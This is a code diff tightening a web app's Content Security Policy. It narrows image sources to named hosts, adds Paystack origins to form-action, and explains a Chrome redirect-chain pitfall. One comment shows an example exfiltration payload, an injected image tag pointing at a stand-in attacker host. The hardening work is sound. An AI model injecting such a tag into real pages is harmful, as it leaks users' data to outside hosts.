@@ -83,6 +83,47 @@ function supabaseOrigins(): string[] {
 }
 
 /**
+ * Every host this platform loads a picture from, as CSP sources.
+ *
+ * Kept in step with the `images.remotePatterns` allowlist in `next.config.ts`
+ * by hand, because the two lists are read by different runtimes and there is
+ * no shared module either of them can import. A host added there and forgotten
+ * here shows a broken image; a host added here and forgotten there throws a
+ * 500 out of the image optimiser. The second failure is louder, which is the
+ * right way round.
+ *
+ * The Supabase storage origin is NOT in this list. It is added at call time
+ * from `supabaseOrigins()`, so it follows the project URL rather than being
+ * written down twice.
+ */
+const IMAGE_HOSTS: readonly string[] = [
+  // Stock photography used by editorial surfaces.
+  "https://images.unsplash.com",
+  // The avatar a Google account already has. Google picks the shard, lh3
+  // through lh6, so the wildcard is on the subdomain and nothing wider.
+  "https://*.googleusercontent.com",
+  // Basemap raster tiles. Both providers, because which one is drawn depends
+  // on whether NEXT_PUBLIC_MAPTILER_KEY is set at runtime. See lib/maps/tiles.
+  "https://basemaps.cartocdn.com",
+  "https://api.maptiler.com",
+];
+
+/**
+ * Where a payment is allowed to take somebody.
+ *
+ * Read by `form-action`, and by nothing else: no Paystack script runs in this
+ * app and no browser code calls their API, so these origins are not in
+ * `script-src` or `connect-src` and must not be added there without a reason
+ * written down beside them.
+ */
+const PAYSTACK_ORIGINS: readonly string[] = [
+  "https://checkout.paystack.com",
+  "https://checkout.paystack.co",
+  "https://standard.paystack.co",
+  "https://paystack.com",
+];
+
+/**
  * The policy, for one request.
  *
  * Every directive below is either the strictest value that works or carries the
@@ -119,21 +160,32 @@ export function contentSecurityPolicy(nonce: string): string {
     ["style-src", ["'self'", "'unsafe-inline'"]],
 
     /*
-     * Images are the one place a wildcard is correct. Partner hotel photos come
-     * from LiteAPI, which serves each property's pictures from whichever CDN
-     * that supplier uses, so the host set is not knowable at build time and
-     * changes per hotel. `https:` allows any image over TLS and nothing else:
-     * `data:` for inline placeholders and `blob:` for a photo being previewed
-     * before upload. It cannot execute.
+     * Images used to be `https:`, a wildcard over every host on the web, and
+     * exactly one thing justified it: LiteAPI served each partner hotel's
+     * photos from whichever CDN that supplier happened to use, so the host set
+     * was genuinely unknowable at build time.
+     *
+     * There are no partner photos any more. Every image on this platform now
+     * comes from a host we can name, so the wildcard is closed and the list is
+     * the real one. It is the same set `next.config.ts` allows `next/image` to
+     * optimise, plus the two basemap providers, which serve raster tiles as
+     * plain `<img>` elements and are therefore governed by this directive
+     * rather than by `connect-src`.
+     *
+     * A photo that fails to load is a grey tile. A wildcard that stays open
+     * because nobody revisited it is an exfiltration channel: an injected
+     * `<img src="https://attacker/?=...">` is a GET to anywhere, carrying
+     * whatever the URL was built from.
      */
-    ["img-src", ["'self'", "data:", "blob:", "https:"]],
+    ["img-src", ["'self'", "data:", "blob:", ...IMAGE_HOSTS, ...supabase]],
 
     // Self-hosted faces only, and `data:` for nothing. See public/fonts.
     ["font-src", ["'self'"]],
 
-    // The browser talks to us and to Supabase. Nothing else, including no
-    // partner API: every provider call in lib/inventory is server side, and
-    // this directive is what would catch it if one ever stopped being.
+    // The browser talks to us and to Supabase, and to nothing else at all.
+    // Every payment call is server side, so Paystack does not belong here:
+    // if a browser ever starts calling an API directly, this directive is
+    // what reports it.
     ["connect-src", ["'self'", ...supabase]],
 
     // No plugins, no applets, ever.
@@ -151,12 +203,32 @@ export function contentSecurityPolicy(nonce: string): string {
     ["base-uri", ["'self'"]],
 
     /*
-     * Forms post to us and to nowhere else. Paystack is reached by NAVIGATION
-     * to an authorization_url rather than by a cross-origin form post, so the
-     * checkout is unaffected by this; if that ever changes to a posted form,
-     * this directive is what will report it before it silently breaks.
+     * `'self'` alone here was a live bug waiting on one environment variable.
+     *
+     * The old note said Paystack is reached by NAVIGATION to an
+     * authorization_url rather than by a cross-origin form post, so
+     * `form-action 'self'` could not affect the checkout. That is half right
+     * and the wrong half is the one that breaks wallet funding. The deposit
+     * flow submits a form to our own route, and that route answers with a
+     * redirect to Paystack. Chrome applies `form-action` to the ENTIRE
+     * redirect chain a form submission follows, not only to its first hop, so
+     * a same-origin POST that redirects off site is blocked by `'self'` just
+     * as a cross-origin POST would be. Firefox does not do this, which is
+     * exactly how a bug like this reaches production: it works on the machine
+     * of whoever tested it.
+     *
+     * Nothing is wrong today only because `CSP_ENFORCE` is unset and the
+     * policy is report-only. The day it is set to "true", every deposit dies
+     * at the redirect with a console error and no server-side trace. So the
+     * Paystack origins are named now, while the cost of being wrong is a
+     * report rather than a dead checkout.
+     *
+     * Both TLDs are listed because Paystack has used both: older integrations
+     * are redirected to `checkout.paystack.com` and newer ones to
+     * `checkout.paystack.co`, the choice is made by their API rather than by
+     * us, and an authorization_url is opaque to this codebase.
      */
-    ["form-action", ["'self'"]],
+    ["form-action", ["'self'", ...PAYSTACK_ORIGINS]],
 
     // A service worker is registered (public/sw.js), and it may be created
     // from a blob by the framework's own loader.
